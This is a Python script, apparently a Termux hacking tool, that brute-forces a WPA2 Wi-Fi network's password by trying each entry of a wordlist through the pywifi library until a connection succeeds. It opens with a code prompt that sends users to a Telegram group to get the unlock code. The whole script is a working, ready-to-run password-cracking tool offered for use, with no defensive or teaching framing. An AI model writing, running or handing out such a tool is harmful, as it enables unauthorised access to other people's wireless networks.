import time 
from colorama import Fore ,Back ,Style ,init 
init (autoreset =True )
def startMessage ():
    OO0O0OO0OOO0OO0O0 =input (Fore .YELLOW +"Enter Code: ")
    OOOO0OO000OO0OOOO ="sorry"
    if OOOO0OO000OO0OOOO !=OO0O0OO0OOO0OO0O0 :
        print (Fore .RED +'[X] wrong code')
        print (Fore .BLUE +''' 
   1. Join my Telegram Group for Code 
   2. Group Link:https://t.me/Termux_official_01
   3. Send massage for code
   4. Next time come with code and use this tool
   5. bye
    ''')
        startMessage ()
    else :
        print (Fore .GREEN +"Successfully Unlocked Tool!")
        pass 
if __name__ =="__main__":
    startMessage ()

from setup.banner import banner , banner2 , clear
from setup.colors import r,c,g,y,ran
from setup.sprint import sprint


clear()
banner()
yes = ["y" , "yes"]
no = ["n" , "no"] 

import sys
import os
import os.path
import platform
import re
import time

import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile

try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan() 
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")

type = False

def main(ssid, password):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.5) 
    iface.connect(tmp_profile) 
    time.sleep(0.35) 

    if ifaces.status() == const.IFACE_CONNECTED: 
        time.sleep(1)
        print("[+] Password Found!")
        print("[+] Password is: " + password)
        time.sleep(1)
        return "Success"
    else:
        print('[-] Password Not Found! : ' + password)

def pwd(ssid, file):
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            line = line.split("\n")
            pwd = line[0]
            result = main(ssid, pwd)
            if result == "Success":
                break
                    


def menu():
    print("""
 __      ___  __ _   ___          _         ___               
 \ \    / (_)/ _(_) | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
  \ \/\/ /| |  _| | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
   \_/\_/ |_|_| |_| |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
<--------------------------------------------------------------->
    """)
    ssid = input("[*] Wifi Name: ") 
    file = input("[*] Passwords File: ") 

    if os.path.exists(file):
        print("[~] Cracking...")
        pwd(ssid, file)

    else:
        print("[-] File Not Found!")


if __name__ == "__main__":
    menu()
